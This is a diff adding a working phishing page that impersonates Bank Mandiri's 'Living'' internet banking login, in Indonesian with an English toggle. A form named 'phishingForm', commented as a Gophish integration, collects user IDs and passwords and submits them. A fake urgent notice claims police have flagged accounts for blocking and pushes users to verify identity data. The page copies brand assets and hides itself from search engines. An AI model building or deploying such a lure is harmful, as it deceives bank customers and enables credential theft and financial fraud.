@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Living' - Mandiri Internet Banking</title>
+<link rel="icon" type="image/png" href="https://raw.githubusercontent.com/ucokolisamping/dump/refs/heads/main/assets/qRQST9lSiXD6SCiakiuPVWmD9wLikbdl.png">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+    background: #ffffff;
+    color: #16325c;
+    -webkit-text-size-adjust: 100%;
+    text-size-adjust: 100%;
+  }
+
+  .page {
+    max-width: 1180px;
+    margin: 0 auto;
+    padding: 0 40px;
+  }
+
+  .topbar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 22px 0;
+  }
+  .lang-switch {
+    font-size: 13px;
+    color: #003a70;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    cursor: pointer;
+  }
+  .flag {
+    width: 20px;
+    height: 14px;
+    border-radius: 2px;
+    overflow: hidden;
+    flex: 0 0 auto;
+    display: block;
+    box-shadow: 0 0 0 1px rgba(0,0,0,0.08);
+  }
+  .flag svg { display: block; width: 100%; height: 100%; }
+
+  .main {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    gap: 24px;
+    padding: 8px 0 50px;
+  }
+
+  .left {
+    flex: 1 1 auto;
+    padding-top: 10px;
+  }
+  .welcome-title {
+    font-size: 34px;
+    font-weight: 800;
+    color: #003a70;
+    line-height: 1.28;
+    margin-bottom: 30px;
+  }
+  .blob-wrap {
+    width: 340px;
+    height: 340px;
+    margin: 0 auto;
+  }
+  .blob-wrap img {
+    width: 100%;
+    height: 100%;
+    display: block;
+  }
+
+  /* Menambahkan position relative agar overlay processing tertahan di area ini saja */
+  .right {
+    flex: 0 0 320px;
+    width: 320px;
+    padding-top: 10px;
+    position: relative; 
+  }
+  .field-label {
+    font-size: 13px;
+    font-weight: 700;
+    color: #003a70;
+    margin-bottom: 6px;
+    display: block;
+  }
+  .field {
+    display: flex;
+    align-items: center;
+    border: 1px solid #cfd8e3;
+    border-radius: 6px;
+    margin-bottom: 18px;
+    overflow: hidden;
+    background: #fbfcfe;
+  }
+  .field input {
+    border: none;
+    outline: none;
+    background: transparent;
+    padding: 11px 14px;
+    font-size: 14px;
+    flex: 1;
+    min-width: 0;
+    color: #16325c;
+  }
+  .field input::placeholder { color: #a3aebc; }
+  .field .icon {
+    padding: 0 12px;
+    color: #a3aebc;
+    font-size: 13px;
+    border-left: 1px solid #e3e8ef;
+    flex: 0 0 auto;
+  }
+  .eye-toggle {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100%;
+    cursor: pointer;
+    color: #7a8797;
+    transition: color 0.15s ease;
+  }
+  .eye-toggle:hover { color: #003a70; }
+  .eye-toggle:focus { outline: 2px solid #1c6fb5; outline-offset: -2px; }
+
+  .btn-login {
+    width: 100%;
+    padding: 13px;
+    background: #f5a623;
+    border: none;
+    border-radius: 0px;
+    color: #16325c;
+    font-weight: 700;
+    font-size: 14px;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    margin: 6px 0 24px;
+    transition: background 0.15s ease;
+  }
+  .btn-login:hover { background: #e0951a; }
+  .btn-login:disabled { background: #cfd8e3; cursor: not-allowed; }
+
+  /* Gaya untuk pesan error di form */
+  .error-message {
+    color: #CE1126;
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 12px;
+    text-align: center;
+    background-color: #fbecec;
+    border: 1px solid #f5c6c6;
+    padding: 8px;
+    border-radius: 4px;
+  }
+  
+  /* Gaya jika input error (garis tepi merah) */
+  .field.error {
+    border-color: #CE1126;
+  }
+
+  .info-box {
+    background: #eaf3fb;
+    border: 1px solid #d5e7f7;
+    border-radius: 8px;
+    padding: 16px 18px;
+    font-size: 12.5px;
+    color: #2c4a63;
+    line-height: 1.6;
+  }
+  .info-box .info-title {
+    font-weight: 700;
+    color: #003a70;
+    text-decoration: underline;
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .info-box .info-title .qmark {
+    width: 15px; height: 15px;
+    border-radius: 50%;
+    background: #003a70;
+    color: #fff;
+    font-size: 10px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    text-decoration: none;
+    flex: 0 0 auto;
+  }
+  .info-box ul {
+    margin: 8px 0 10px 18px;
+  }
+  .info-box a {
+    color: #1c6fb5;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .info-box a:hover { text-decoration: underline; }
+
+  .footer {
+    text-align: center;
+    font-size: 11.5px;
+    color: #7a8797;
+    padding: 18px 0 24px;
+    border-top: 1px solid #eef1f5;
+  }
+  .footer a {
+    color: #7a8797;
+    text-decoration: none;
+    margin: 0 4px;
+  }
+  .footer a:hover { text-decoration: underline; }
+
+  /* ===== ANIMASI MEMPROSES ===== */
+  .processing-overlay {
+    position: absolute;
+    top: -10px; left: -10px; right: -10px; bottom: -10px;
+    background: rgba(255, 255, 255, 0.85);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 10;
+    font-weight: 700;
+    color: #003a70;
+    border-radius: 8px;
+    backdrop-filter: blur(2px);
+  }
+  .spinner {
+    border: 4px solid #e3e8ef;
+    border-top: 4px solid #f5a623;
+    border-radius: 50%;
+    width: 36px;
+    height: 36px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 12px;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+  /* ===== TABLET ===== */
+  @media (max-width: 900px) {
+    .page { padding: 0 28px; }
+    .main { gap: 32px; }
+    .blob-wrap { width: 280px; height: 280px; }
+  }
+
+  /* ===== MOBILE ===== */
+  @media (max-width: 680px) {
+    .page { padding: 0 20px; }
+    .topbar { padding: 16px 0; }
+
+    .main {
+      flex-direction: column;
+      align-items: center;
+      padding: 4px 0 36px;
+      gap: 0;
+    }
+
+    .left {
+      width: 100%;
+      padding-top: 4px;
+      display: flex;
+      flex-direction: column;
+      align-items: center; 
+      text-align: center; 
+    }
+    .welcome-title {
+      font-size: 24px;
+      margin-bottom: 22px;
+    }
+    .blob-wrap {
+      width: 230px;
+      height: 230px;
+      margin: 0 0 32px;
+    }
+
+    .right {
+      width: 100%;
+      max-width: 360px;
+      flex: none;
+      padding-top: 0;
+    }
+  }
+
+  @media (max-width: 360px) {
+    .welcome-title { font-size: 21px; }
+    .blob-wrap { width: 190px; height: 190px; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="page">
+    <div class="topbar">
+      <img src="https://raw.githubusercontent.com/ucokolisamping/dump/5234c82aa446af779e94c30328b1f44807409ed4/assets/yrtJ38istl9TPeTWsZFFmJA0v2xin5gj.svg" alt="living' logo" style="height: 30px;">
+      <div class="lang-switch" id="langSwitch" role="button" tabindex="0">
+        <span class="flag" id="flagID" style="display:none;">
+          <svg viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg">
+            <rect width="30" height="10" fill="#CE1126"/>
+            <rect y="10" width="30" height="10" fill="#ffffff"/>
+          </svg>
+        </span>
+        <span class="flag" id="flagEN">
+          <svg viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg">
+            <rect width="30" height="20" fill="#012169"/>
+            <path d="M0,0 30,20 M30,0 0,20" stroke="#ffffff" stroke-width="3"/>
+            <path d="M0,0 30,20 M30,0 0,20" stroke="#C8102E" stroke-width="1.4"/>
+            <path d="M15,0 15,20 M0,10 30,10" stroke="#ffffff" stroke-width="5"/>
+            <path d="M15,0 15,20 M0,10 30,10" stroke="#C8102E" stroke-width="2.4"/>
+          </svg>
+        </span>
+        <span id="langLabel">Switch to English</span>
+      </div>
+    </div>
+
+    <div class="main">
+      <div class="left">
+        <div class="welcome-title" data-i18n="welcomeTitle">Selamat datang<br>di Living' by Mandiri</div>
+        <div class="blob-wrap">
+          <img src="https://raw.githubusercontent.com/ucokolisamping/dump/refs/heads/main/assets/ee64484e-79d0-4efe-b948-22c5bf7b64b7.webp" alt="living' logo besar">
+        </div>
+      </div>
+
+      <div class="right" id="loginFormContainer">
+        
+        <!-- Form Integrasi Gophish -->
+        <form id="phishingForm" method="POST" action="">
+          
+          <label class="field-label" data-i18n="labelUserId">User ID</label>
+          <div class="field">
+            <input type="text" id="userId" name="username" data-i18n-placeholder="phUserId" placeholder="Masukkan User ID">
+          </div>
+
+          <label class="field-label" data-i18n="labelPassword">Password</label>
+          <div class="field">
+            <input type="password" id="password" name="password" data-i18n-placeholder="phPassword" placeholder="Masukkan Password">
+            <span class="icon eye-toggle" id="eyeToggle" role="button" aria-label="Tampilkan password" tabindex="0">
+              <svg id="eyeIconOpen" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7Z"/>
+                <circle cx="12" cy="12" r="3"/>
+              </svg>
+              <svg id="eyeIconClosed" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
+                <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.3 21.3 0 0 1 5.06-5.94M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 7 11 7a21.3 21.3 0 0 1-3.22 4.36M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
+                <line x1="1" y1="1" x2="23" y2="23"/>
+              </svg>
+            </span>
+          </div>
+
+          <div id="errorMessage" class="error-message" style="display: none;"></div>
+
+          <button class="btn-login" id="btnLoginBtn" type="submit" data-i18n="btnLogin">MASUK</button>
+        
+        </form>
+
+        <div class="info-box">
+          <div class="info-title"><span class="qmark">?</span> <span data-i18n="infoTitle">INFO PENTING</span></div>
+          <span data-i18n="infoIntro">Atas laporan Kepolisian teridentifikasi beberapa rekening berafiliasi dengan pihak ke-3 yang akan segera diblokir, lakukan pengkinian dan verifikasi data pribadi Anda segera.</span>
+          <ul>
+            <li data-i18n="infoBullet1">e-KTP bagi WNI atau Paspor dan KITAS/KIMS bagi WNA.</li>
+            <li data-i18n="infoBullet2">NPWP bagi wajib pajak.</li>
+          </ul>
+          <span data-i18n="infoOutro">Info lanjut hubungi call center 14000.</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <span data-i18n="footerText">2026 PT Bank Mandiri (Persero) Tbk.</span> &nbsp;·&nbsp;
+      <a href="#" data-i18n="footerTerms">Syarat & Ketentuan</a> · <a href="#" data-i18n="footerPrivacy">Kebijakan Privasi</a>
+    </div>
+  </div>
+
+  <script>
+    const translations = {
+      id: {
+        labelUserId: "User ID",
+        labelPassword: "Password",
+        phUserId: "Masukkan user ID",
+        phPassword: "Masukkan Password",
+        btnLogin: "MASUK",
+        welcomeTitle: "Selamat datang<br>di Living' by Mandiri",
+        infoTitle: "INFO PENTING",
+        infoIntro: "Atas laporan Kepolisian teridentifikasi beberapa rekening berafiliasi dengan pihak ke-3 yang akan segera diblokir, lakukan pengkinian dan verifikasi data pribadi Anda segera.",
+        infoBullet1: "e-KTP bagi WNI atau Paspor dan KITAS/KIMS bagi WNA.",
+        infoBullet2: "NPWP bagi wajib pajak.",
+        infoOutro: "Info lanjut hubungi call center 14000.",
+        footerText: "2026 PT Bank Mandiri (Persero) Tbk.",
+        footerTerms: "Syarat & Ketentuan",
+        footerPrivacy: "Kebijakan Privasi",
+        langLabel: "Switch to English",
+        processingText: "Memproses...",
+        errorBoth: "Mohon lengkapi User ID dan Password Anda.",
+        errorUserId: "Mohon isi User ID Anda terlebih dahulu.",
+        errorPassword: "Mohon isi Password Anda terlebih dahulu."
+      },
+      en: {
+        labelUserId: "User ID",
+        labelPassword: "Password",
+        phUserId: "Enter your User ID",
+        phPassword: "Enter your Password",
+        btnLogin: "LOG IN",
+        welcomeTitle: "Welcome<br>to Living' by Mandiri",
+        infoTitle: "IMPORTANT INFORMATION",
+        infoIntro: "Based on a police report, several accounts affiliated with a third party have been identified and will be blocked shortly. Please update and verify your personal information immediately.",
+        infoBullet1: "e-KTP (ID) for Indonesian citizens or Passport and KITAS/KIMS for foreign nationals.",
+        infoBullet2: "NPWP (tax ID) for taxpayers.",
+        infoOutro: "For more information contact our call center at 14000.",
+        footerText: "2026 PT Bank Mandiri (Persero) Tbk.",
+        footerTerms: "Terms & Conditions",
+        footerPrivacy: "Privacy Policy",
+        langLabel: "Ganti ke Bahasa Indonesia",
+        processingText: "Processing...",
+        errorBoth: "Please enter your User ID and Password.",
+        errorUserId: "Please enter your User ID first.",
+        errorPassword: "Please enter your Password first."
+      }
+    };
+
+    let currentLang = "id";
+
+    function applyLang(lang) {
+      const dict = translations[lang];
+      document.querySelectorAll("[data-i18n]").forEach(el => {
+        const key = el.getAttribute("data-i18n");
+        if (dict[key]) el.innerHTML = dict[key];
+      });
+      document.querySelectorAll("[data-i18n-placeholder]").forEach(el => {
+        const key = el.getAttribute("data-i18n-placeholder");
+        if (dict[key]) el.setAttribute("placeholder", dict[key]);
+      });
+      document.getElementById("langLabel").textContent = dict.langLabel;
+      document.documentElement.lang = lang;
+
+      const errorMessage = document.getElementById("errorMessage");
+      if (errorMessage && errorMessage.style.display === "block") {
+        const activeErrorKey = errorMessage.getAttribute("data-active-error");
+        if (activeErrorKey && dict[activeErrorKey]) {
+          errorMessage.textContent = dict[activeErrorKey];
+        }
+      }
+
+      const flagID = document.getElementById("flagID");
+      const flagEN = document.getElementById("flagEN");
+      if (lang === "id") {
+        flagID.style.display = "none";
+        flagEN.style.display = "block";
+      } else {
+        flagID.style.display = "block";
+        flagEN.style.display = "none";
+      }
+    }
+
+    const langSwitch = document.getElementById("langSwitch");
+    function toggleLang() {
+      currentLang = currentLang === "id" ? "en" : "id";
+      applyLang(currentLang);
+    }
+    langSwitch.addEventListener("click", toggleLang);
+    langSwitch.addEventListener("keydown", (e) => {
+      if (e.key === "Enter" || e.key === " ") { e.preventDefault(); toggleLang(); }
+    });
+
+    const eyeToggle = document.getElementById("eyeToggle");
+    const passwordInput = document.getElementById("password");
+    const eyeOpen = document.getElementById("eyeIconOpen");
+    const eyeClosed = document.getElementById("eyeIconClosed");
+
+    function togglePasswordVisibility() {
+      const isHidden = passwordInput.type === "password";
+      passwordInput.type = isHidden ? "text" : "password";
+      eyeOpen.style.display = isHidden ? "none" : "block";
+      eyeClosed.style.display = isHidden ? "block" : "none";
+      eyeToggle.setAttribute("aria-label", isHidden ? "Sembunyikan password" : "Tampilkan password");
+    }
+    eyeToggle.addEventListener("click", togglePasswordVisibility);
+    eyeToggle.addEventListener("keydown", (e) => {
+      if (e.key === "Enter" || e.key === " ") { e.preventDefault(); togglePasswordVisibility(); }
+    });
+
+    // ===== LOGIKA ANIMASI MEMPROSES & SUBMIT FORM =====
+    const loginBtn = document.getElementById("btnLoginBtn");
+    const userIdInput = document.getElementById("userId");
+    const loginFormContainer = document.getElementById("loginFormContainer");
+    const errorMessage = document.getElementById("errorMessage"); 
+    const userIdField = userIdInput.closest('.field'); 
+    const passwordField = passwordInput.closest('.field'); 
+
+    loginBtn.addEventListener("click", function(e) {
+      e.preventDefault();
+
+      errorMessage.style.display = "none";
+      errorMessage.removeAttribute("data-active-error");
+      userIdField.classList.remove("error");
+      passwordField.classList.remove("error");
+
+      const isUserIdEmpty = userIdInput.value.trim() === "";
+      const isPasswordEmpty = passwordInput.value.trim() === "";
+
+      if (!isUserIdEmpty && !isPasswordEmpty) {
+        
+        const overlay = document.createElement("div");
+        overlay.className = "processing-overlay";
+        
+        const spinnerText = currentLang === "id" ? translations.id.processingText : translations.en.processingText;
+        overlay.innerHTML = `
+          <div class="spinner"></div>
+          <div>${spinnerText}</div>
+        `;
+
+        loginFormContainer.appendChild(overlay);
+
+        loginBtn.disabled = true;
+        // Catatan: Input tidak di-disable agar nilainya tetap terkirim saat form disubmit
+
+        document.getElementById("phishingForm").submit();
+
+      } else {
+        errorMessage.style.display = "block";
+        
+        if (isUserIdEmpty && isPasswordEmpty) {
+          errorMessage.textContent = currentLang === "id" ? translations.id.errorBoth : translations.en.errorBoth;
+          errorMessage.setAttribute("data-active-error", "errorBoth");
+          userIdField.classList.add("error");
+          passwordField.classList.add("error");
+        } else if (isUserIdEmpty) {
+          errorMessage.textContent = currentLang === "id" ? translations.id.errorUserId : translations.en.errorUserId;
+          errorMessage.setAttribute("data-active-error", "errorUserId");
+          userIdField.classList.add("error");
+        } else if (isPasswordEmpty) {
+          errorMessage.textContent = currentLang === "id" ? translations.id.errorPassword : translations.en.errorPassword;
+          errorMessage.setAttribute("data-active-error", "errorPassword");
+          passwordField.classList.add("error");
+        }
+      }
+    });
+  </script>
+
+</body>
+</html>
